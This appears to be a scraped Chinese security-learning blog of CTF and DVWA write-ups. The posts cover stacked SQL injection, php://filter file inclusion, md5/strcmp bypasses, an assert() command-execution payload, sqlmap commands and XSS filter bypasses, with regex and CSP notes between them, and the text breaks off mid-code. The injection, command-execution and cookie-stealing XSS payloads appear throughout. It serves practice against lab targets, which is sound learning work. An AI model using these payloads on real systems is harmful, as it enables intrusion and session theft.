我们用蚁剑连接，密码Syc 点击虚拟终端，cat /flag [强网杯 2019]随便注：（sql堆叠注入+数据库语句的使用）点开容器 是一道sql注入题，先拿sqlmap跑一下，发现跑不出来。那就手工注入吧 猜注入类型：0&#39; or 1=1# 查询有结果 ​ 0&#39; or 1=2#查询无结果 猜字段：1&#39; order by 2# 查询有结果 ​ 1&#39; order by 3# 查询无结果 查看返回值：1&#39; union select 1,2# 发现它使用正则匹配过滤掉了很多词，尝试一下堆叠注入。 爆库：payload：1&#39;;show databases# 爆表：payload：1&#39;;show tables# 这里其实有个疑惑，就是我们查表没指明库，不应该跳出所有的表吗？但是他跳出来的是supersqli库里的表？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？ 爆列：payload：1’; show columns from `1919810931114514`# sp:当字符串为表名，引用时要加反单引号 1919810931114514表中只有flag一列，由此看来，1919810931114514不是默认表，访问一下words表——1&#39;; show columns from words# words表中含有data和id两个列。那么我们可以猜测数据库中的查询语句可能是select id,data from words where id= 而我们的目标是获取列flag的值 法1：由于我们看到数据库默认的表是words，那么我们可以尝试改造`1919810931114514 `——将words表名改为words1，1919810931114514改为words，然后将列名flag改为id，最后在构造0&#39; or 1=1#即可 payload：1&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100);desc words# 我们看到原列名flag被改为了id，然后payload:0&#39; or 1=1# 法2： MySQL数据库中还可以使用handler查询内容： HANDLER table_name OPEN——打开一张表，无返回结果，HANDLER table_name READ FIRST——获取数据表第一行，通过将 READ FIRST改成READ NEXT依次获取其它行。有点类似于指针。HANDLER table_name CLOSE——来关闭打开的表。 索引去查看的话要按上述一定的顺序，获取表中的数据： HANDLER table_name READ index_name FIRST——获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 索引列指定一个值，可以指定从哪一行开始： HANDLER table_name READ index_name = value——指定从哪一行开始，通过NEXT继续浏览。 因此，我们构造payload：0’;handler `1919810931114514` open;handler `1919810931114514` read first# [SUCTF 2019]EasySQL：（sql堆叠注入）一道post型sql注入题，sqlmap跑一下，发现跑不出来 手工注入： 1’ 没有回显，可能屏蔽了回显报错，那么报错注入肯定不可能了 1’ or 1=1# 1‘ and 1=1#也一样，应该是and和or被过滤了 尝试联合注入：1’ union select 1,2# 查询框中单独输入select没有回显，输入union 看来union被过滤了，尝试盲注，先输一个sleep，同样不让，那么盲注也不行了 试试堆叠注入： 试了半天的1’;show databases#都没回显，然后payload改成1;show databases# 才发现这题是数字型注入 1;show tables;# 1;desc flag# 刚开始我还以为他过滤了desc，结果单输flag发现原来是过滤了flag 那么做到现在我们先整理一下思路—— 1.当我们输入任意数字，回显都是1 而当输入非数字内容时，则无回显 2.由于过滤了，那么查询语句中肯定有固定的Flag 初步猜测大致为： select $query xxx from Flag 3.尝试用逗号隔开查询列数 输入10,2 输入 10,8,6 我们发现我们输入的最后一个数返回的本应该是其本身，但是这里无论输入什么返回都是1 于是我们猜测：select $query ||1 from Flag 我们知道select *from Flag是获取Flag的所有内容 那么此处我们可以构造payload：$query=*,1 （代入查询语句中就是：select *,1 ||1 from Flag 等价于：select *from Flag） 最终得： 这边有一点注意： 这也是为什么上面第3点为什么我们输入的前几位都是返回其本身 其实还有一种，但是我感觉更麻烦，留一个payload吧：1;set sql_mode=pipes_as_concat; select 1 参考博客：https://blog.csdn.net/ratear/article/details/109560061","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"正则匹配","date":"2021-04-04T08:04:04.000Z","path":"2021/04/04/正则表达式/","text":"正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。 正则表达式常用修饰符： 修饰符 含义 描述 i ignore - 不区分大小写 将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。 g global - 全局匹配 查找所有的匹配项。 m multi line - 多行匹配 使边界字符 ^ 和 $ 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。 s 特殊字符圆点 . 中包含换行符 \\n 默认情况下的圆点 . 是 匹配除换行符 \\n 之外的任何字符，加上 s 修饰符之后, . 中包含换行符 \\n。 常见的正则匹配字符: 字符 描述 \\ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\\n’ 匹配一个换行符。序列 ‘\\\\‘ 匹配 “\\“ 而 “\\(“ 则匹配 “(“。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\\n’ 或 ‘\\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\\n’ 或 ‘\\r’ 之前的位置。 \\d 匹配一个数字字符。等价于 [0-9]。 \\d+ 匹配多个数字。 \\D 匹配一个非数字字符。等价于 [ ^0-9]。 x|y 匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[ ^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[ ^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 . 匹配任何字符，换行符（\\n、\\r）除外。 PHP的正则表达式有一些内置的通用字符簇，列表如下： 字符簇 描述 [[:alpha:]] 任何字母 [[:digit:]] 任何数字 [[:alnum:]] 任何字母和数字 [[:space:]] 任何空白字符 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 [[:punct:]] 任何标点符号 [[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F] sp： php的正则表达式需要放在// 之间 参考：https://www.runoob.com/regexp/regexp-tutorial.html","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"JS","date":"2021-03-18T10:52:29.000Z","path":"2021/03/18/DVWA—JS/","text":"前言：javascript一种常用于页面代码中，用来实现动态效果的脚本语言。由于JS是存储在客户端，所以过分依赖JS代码逻辑，容易被攻击者获取代码后，进行数据伪造。 Low：先提交默认数据 提交success 无效的token怎么回事呢？查看网页源码 我们看到token由前端生成，与服务器无关，但是前端的token是根据ChangeMe来生成的，而服务器要的token是根据success生成的。 利用控制台执行代码 我们将箭号所指的token的值用上面弹框中的值替换 Medium：http://www.bubuko.com/infodetail-2905900.html","tags":[{"name":"DVWA—labs","slug":"DVWA—labs","permalink":"http://example.com/tags/DVWA%E2%80%94labs/"}]},{"title":"CSP","date":"2021-03-18T10:40:08.000Z","path":"2021/03/18/DVWA—CSP/","text":"Content-Security-Policy指的是内容安全检测，又称网页安全政策，CSP的实质就是白名单制度。 Content-Security-Policy（内容安全策略）是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。是为了缓解潜在的跨站脚本问题（XSS）。原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。开发者只需要提供配置，实现和执行全部由浏览器完成。简而言之就是在前端添加一些标签，告诉浏览器哪些资源可以加载访问。","tags":[{"name":"dvwa—labs","slug":"dvwa—labs","permalink":"http://example.com/tags/dvwa%E2%80%94labs/"}]},{"title":"bugku(1)","date":"2021-03-16T14:56:40.000Z","path":"2021/03/16/bugku1/","text":"web11：（御剑扫描后端） 这题的题目是：网站被黑了 黑客会不会留下后门 那么我们要借助御剑这个后门扫描工具，扫描目标网站，发现有个shell.php文件 访问shell.php 用bp抓包爆破可知密码为hack pass为hack，登入 web13：（url解码）题目叫我们看看源码，我们看看源码： 我们对其url解码： 12345678910function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) return!0; alert(&quot;Error&quot;); a.focus(); return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit; 提交字符串67d709b2b54aa2aa648cf6e87a7114f1 web14：（文件包含加php://filter）进入题目，看到 点击click me？ no跳转 发现是文件包含题。 补充 include()函数对文件后缀名无要求，而对其中的语法有要求，即使后缀名为txt，jpg也会被当做php文件解析，只要文件内是形式就可以执行，但是如果不是php语法的形式，即使后缀为php，也无法执行。 php://filter 设计用来过滤筛选文件。如果想要读取运行php文件的源码，需要先对该php文件内容base64编码，再传入include函数，这样就不会被认为是php代码，不会执行，会输出文件的base64编码，后续再解码即可获得源码。 故本题payload为：php://filter/read=convert.base64-encode/resource=index.php base64解码： 参考博客: https://blog.csdn.net/zpy1998zpy/article/details/80598768 https://www.freebuf.com/column/148886.html web16：（MD5()函数绕过）进入环境后发现就一串数字，其他什么也没有，检查网页源码，抓包看回显都没有什么线索，又用御剑扫描网页后台 发现一个.bak拓展名（bak这种备份文件在我们平常使用绘图、编程软件时都会默认创建备份文件，如cad文件修改后会产生bak文件，wps、word等文件修改后也都会产生bak备份文件，这样可以保证当源文件不小心被删掉或者出现故障导致无故自动退出时，还可以从bak备份文件继续编辑，减少了不少误操作带来的损失。）的文件，结合描述的信息：备份是个好习惯，我们可以猜测这个.bak拓展名文件应该有东西 下载文件并打开 我们可以看到key1和key2本身不能相等，但是被md5编码后两者要相等才能得到flag。 总的来说这是一道文件包含漏洞+绕过字符串过滤+绕过md5编码的题 我们用双写绕过字符串过滤，利用md5()函数无法处理数组（如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。）达成if条件。 因此我们的payload是?kekeyy1[]=1&amp;kekeyy2[]=2 web17:(sql注入——post型)1.手工注入：查数字段值：0’ union select 1,2,3,4# 爆库：0’ union select 1,2,3,database()# 爆表：0’ union select 1,2,3,group_concat(table_name) from information_schema.talbes where table_schema=’skctf’# 爆列：0’ union select 1,2,3,group_concat(column_name) from information_schema.tables where table_name=fl4g# 爆值：0’ union select 1,2,3,skctf_flag form fl4g# 2.sqlmap爆库：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; --current-db 爆表：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf --tables 爆列：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g --columns 爆值：sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump Web20（line控制返回内容）打开题目地址发现是一堆乱码，我还以为乱码里面有内容，分析了一通，结果什么也没有。 注意到url栏filename的值好像被编码了，base64解码得keys.txt。 变量line的值为多少就返回指定文件中第几行，无值时默认返回第0行 一般index.php都会存在源码，编码index.php 返回index.php第一行源码，只要不断更改line的值最终就可以获得完整的index.php源码（因为我不会写python脚本） index.php源码： 12345678910111213141516171819&lt;?php error_reporting(0);$file=base64_decode(isset($_GET[&#x27;filename&#x27;])?$_GET[&#x27;filename&#x27;]:&quot;&quot;);$line=isset($_GET[&#x27;line&#x27;])?intval($_GET[&#x27;line&#x27;]):0;if($file==&#x27;&#x27;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(&#x27;0&#x27; =&gt;&#x27;keys.txt&#x27;,&#x27;1&#x27; =&gt;&#x27;index.php&#x27;,);if(isset($_COOKIE[&#x27;margin&#x27;]) &amp;&amp; $_COOKIE[&#x27;margin&#x27;]==&#x27;margin&#x27;)&#123;$file_list[2]=&#x27;keys.php&#x27;;&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 我们看到当cookie内容为参数margin=margin时，file_list数组会多一个键值keys.php，然后通过in_array函数检测我们上传的文件名是否在file_list数组中，是则发送key.php文件的内容。 因此我们构造cookie：margin=margin，令filename的值为key.php base64编码后的值。 web21：（编码+加条件绕过）打开题目地址做的第一件就是查看网页源码 发现有一个1p.html文件，打开是一段HTML代码 1234567891011121314151617181920&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE=&quot;Javascript&quot;&gt;&lt;!--var Words =&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot; function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 我们看到word一大串字符串很可疑，结合后面的unescape()函数，断定这里被编码了 用burp解码，顺序为：url解码，base64解码，再url解码 最终得 12345678910111213141516171819202122232425&lt;!--&quot;;if(!$_GET[&#x27;id&#x27;])&#123; header(&#x27;Location: hello.php?id=1&#x27;); exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];if(stripos($a,&#x27;.&#x27;))&#123; echo &#x27;no no no no no no no&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; $flag = &quot;flag&#123;***********&#125;&quot;&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt;--&gt; file_get_contents() 函数：把整个文件读入一个字符串中。 eregi() 作用：不分大小写的正则表达式匹配——在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。 语法：ereg ( string $pattern , string $string , array &amp;$regs = ? ) 代码审计：当id为空时，网页自动跳转到指定文件；参数a中不得有.，否则输出‘no’（这限制了我们直接导入文件）；接着将a的值赋值给参数data；if条件规定：data的值为bugku is a nice plateform!，id的值为0，b值的长度大于5，然后111和b值的第一个字符结合与1114进行匹配，并且b值的第一个字符不能是4。 ereg和eregi的截断漏洞：%00截断及遇到%00则默认为字符串的结束。因此我们构造b=%0023456 php中会把id=0当成id=nothing，也就是空白。那么这题!$_GET[&#39;id&#39;]和$id==0明显冲突矛盾，这时我们要想到PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。因此我们可以构造：?id=0e1 由于if条件规定：data的值为bugku is a nice plateform!因此我们可以利用php://input获取post上传数据的特点， 令?a=php://input并post数据bugku is a nice plateform! 综上所述：payload=?id=0e1&amp;a=php://input&amp;b=%0023456 并post数据bugku is a nice plateform! web22（assert()函数漏洞利用）点开题目发现题目描述那段话： 1234$poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) 以上代码最终等价执行语句：assert($_GET[&#39;s&#39;]) 补充：assert()函数会将括号内的字符串当作php代码执行。 详情参考：https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/ 那么我们可以根据assert()函数的特性，构造payload：?s=system(ls)或?s=system(dir) 访问flaga15808abee46a1d5.txt，得flag web23：（正则表达式）打开题目地址： 我们看到一个正则表达式：/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i，当我们输入的id值满足正则匹配是会输出flag 我们可以把这个正则表达式拆分成：key . * key .&#123;4,7&#125; key : / . / . * key [a-z] [[:punct:]] 分析（从左到右）： key——就是key . ——任意字符 *——匹配前面的子表达式零次或多次 key——就是key .&#123;4,7&#125;——匹配任意字符4到7次 key——就是key :——就是: /——就是/ . ——任意字符 /——就是/ . ——任意字符 *——匹配前面的子表达式零次或多次 key——就是key [a-z]——匹配a-z之间的字母 [[:punct:]]——匹配任意标点符号 依次我们构造payload，以get的方式传参id：?id=key1key1111key:/1/1keya! （payload不唯一） web24：（md5绕过+strcmp函数绕过）打开题目地址，查看源码： 点开code.txt 我们看到有三个参数：v1,v2,v3 要满足条件： 1.v1!=v2 2.md5(v1)=mad5(v2) 3.v3的值等于flag 绕条件1,2 法1：通过数组绕过md5函数加密，如v1[]=1,v2[]=2 法2：利用php弱口令特性，会将0e开头的哈希值都解析为0。常见的md5加密后以0e开头的字符串：240610708、QNKCDZO、aabg7XSs、aabC9RqS等 绕过条件3 利用strcmp函数不能比较数组（比较数组返回为空，及零），构造v3[]=flag 综上，构造flag：?v1[]=1&amp;v2[]=2&amp;v3[]=flag或?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=flag","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"DVWA—XSS","date":"2021-03-13T02:35:57.000Z","path":"2021/03/13/DVWA—XSS/","text":"前言：—）XSS的中文名称叫跨站脚本，是WEB漏洞中比较常见的一种，特点就是可以将恶意HTML/JavaScript代码注入到受害用户浏览的网页上，从而达到劫持用户会话的目的。实际应用中xss可以完成很多操作，这里举两个例子。 窃取网页浏览中的cookie值 在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。 如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。 试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用） 劫持流量实现恶意跳转 这个很简单，就是在网页中想办法插入一句像这样的语句： 1&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt; 那么所访问的网站就会被跳转到百度的首页。【摘自https://zhuanlan.zhihu.com/p/26177815】 —）XSS根据恶意脚本的传递方式可以分为3种，分别为反射型、存储型、DOM型，前面两种恶意脚本都会经过服务器端然后返回给客户端，相对DOM型来说比较好检测与防御，而DOM型不用将恶意脚本传输到服务器在返回客户端。 DOM-based XSS：漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如url，location，referer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM-based XSS漏洞。 反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 存储型XSS：&lt;持久化&gt; 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。 作者：Jewel591 链接：https://www.jianshu.com/p/4fcb4b411a66 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ReflectedLow：查看源码： 1234567891011&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; 新函数 array_key_exists()函数 功能：检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。 语法：array_key_exists(key,array) 参数 描述 key 必需。规定键名。 array 必需。规定数组。 我们可以看到对我们输入的数据没有进行过滤，在框内输入&lt;script&gt;alert(1);&lt;/script&gt; 直接获取用户的cookie：&lt;script&gt;alert(document.cookie)&lt;/script&gt; Medium：查看源码： 1234567891011121314&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 我们看到服务器对&lt;script&gt;进行了过滤处理，但是我们双写绕过就好了：&lt;script&lt;script&gt;&gt;alert(1);&lt;/script&gt; 或者大小写绕过：&lt;Script&gt;alert(1);&lt;/script&gt; High：1234567891011121314&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 我们可以看到服务器使用了正则表达式禁用了标签，但是我们还可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。常用的HTML标签事件还有onerror,oneclick,onmouseover,onload等， 格式如下：onerror/onclick/onmouseover/onload=“执行内容” 1）&lt;img src=&quot;&quot; onerror=alert(&#39;1&#39;)&gt; src 属性规定外部脚本文件的 URL。 onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。 这句话的意思是当加载img图片失败时执行onerror后的代码。 2）&lt;body onload=alert(&#39;1&#39;)&gt; onload 事件会在页面或图像加载完成后立即发生。 3）&lt;a href=&#39;&#39; onclick=alert(&#39;1&#39;)&gt;click me&lt;/a&gt; href是Hypertext Reference的缩写。意思是指定超链接目标的URL。href 属性的值可以是任何有效文档的相对或绝对URL，包括片段标识符和JavaScript代码段。 onclick 事件会在元素被点击时发生 这句话中元素的名称为click me，当点击click me时会执行onclick后面的代码。 4）Iframe:&lt;body onload=alert(1)&gt; iframe:一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。 5）&lt;body onmousemove=alert(&#39;1&#39;)&gt; onmousemove 事件会在鼠标指针移到指定的对象时发生。 这句话有点没明白。 StoredLow：查看源码： 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 我们可以看到服务器对我们上传的数据做了过滤处理防止我们sql注入。但是没有预防xss， 在message栏输入：&lt;script&gt;alert(1);&lt;/script&gt; Medium：查看源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 新函数 htmlspecialchars()函数：把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。 strip_tags()函数：剥去字符串中的 HTML 标签。 我们可以看到js不会再把我们从message处上传的危险内容当作代码解析了，而且服务器对name也进行了过滤处理，但是我们还是可以通过双写和大小写绕过。但是这里我们发现name有输入字数限制，那我们就抓包修改name的值， 然后提交即可 High：查看源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ 